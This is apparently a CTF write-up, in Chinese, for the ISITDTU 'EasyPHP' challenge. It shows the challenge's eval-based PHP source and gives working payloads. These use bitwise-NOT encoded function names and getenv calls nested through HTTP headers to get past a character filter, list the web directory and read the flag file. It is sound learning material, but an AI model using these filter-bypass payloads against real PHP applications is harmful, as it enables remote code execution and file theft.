# EasyPHP

```
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>
```

限制一堆字元，然後非重複字元最多只能用`0xd`個

最後丟進`eval()`跑

很容易想到可以用`~%xx`的方式繞第一個限制

例如: `phpinfo()`為`(~%8F%97%8F%96%91%99%90)();`

裡頭可以看到設了一堆`disable_functions`:

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv
```

然後也設了`open_basedir`: `/var/www/easyphp`

所以可以猜測flag在網頁根目錄下，要列目錄或直接讀檔

<br>

比賽結束前10分鐘，拉屎時突然想到可以用`getenv()`去繞掉長度限制

`getenv("HTTP_T")`會去抓header中`T`的值

所以可以構造類似這樣的東西:

`getenv("HTTP_T")(getenv("HTTP_TT")(getenv("HTTP_TTT")))`一直無限嵌套下去

=> `((~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB))((~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB%AB)((~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB%AB%AB)));`

`T`塞`print_r`、`TT`塞`glob`、`TTT`塞`*`

就能列當前目錄了

=> `Array ( [0] => index.php [1] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )`

接著就直接讀檔 (他不給直接訪問，會403)

`T`塞`readfile`、`TT`塞`n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt`

=> `ISITDTU{Your PHP skill is so good}`

<br>

網站最後一直轉圈圈和502，轉到結束

根本送不了flag

雷炸
